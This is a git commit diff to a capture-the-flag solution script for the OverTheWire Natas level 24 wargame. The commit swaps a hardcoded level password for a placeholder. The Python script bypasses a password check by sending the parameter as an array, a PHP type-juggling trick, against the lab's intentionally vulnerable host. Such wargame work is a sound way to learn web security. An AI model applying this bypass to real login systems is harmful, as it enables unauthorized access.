0ea732788c070c0f0aa84e95bb09d29e88ad415e
mauzinho <mauzware@gmail.com>
2025-06-23 17:43:23 +0200

    natas24.py

--- Natas/natas24.py
+++ Natas/natas24.py
@@ -1,7 +1,7 @@
 import requests
 
 url = "http://natas24.natas.labs.overthewire.org"
-auth = ("natas24", "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd")
+auth = ("natas24", "[PW_HERE]")
 
 # Exploit: send passwd as an array
 r = requests.get(url, params=[("passwd[]", "test")], auth=auth)
